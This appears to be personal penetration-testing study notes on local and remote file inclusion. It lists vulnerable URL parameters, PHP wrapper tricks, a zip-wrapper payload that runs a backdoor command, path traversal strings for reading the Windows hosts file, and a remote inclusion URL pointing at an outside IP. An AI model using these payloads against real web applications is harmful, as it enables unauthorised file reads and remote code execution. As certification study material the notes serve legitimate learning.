[Local File Inclusion](#local-file-inclusion)
[Remote File Inclusion](#remote-file-inclusion)


# Local File Inclusion
- Click stuff to find out if we can find this ?file=, ?page=
- We could also utilize zip://, file:// php://
  - ?file=zip://uploads/upload_xkxkxk.zip%23simple-backdoor&cmd=whoami

![image](https://github.com/nuricheun/OSCP/assets/14031269/c80aca68-e70d-42e5-a1ca-dd124e75324f)

**Windows**
- ?page=C:/Windows/System32/drivers/etc/hosts
- ?page=../../../../../../../../Windows/System32/drivers/etc/hosts
- ?file=zip://uploads/upload_xkxkxk.zip%23simple-backdoor&cmd=whoami

**Linux**



# Remote File Inclusion
- ?page=http://192.168.45.208/somefile.php
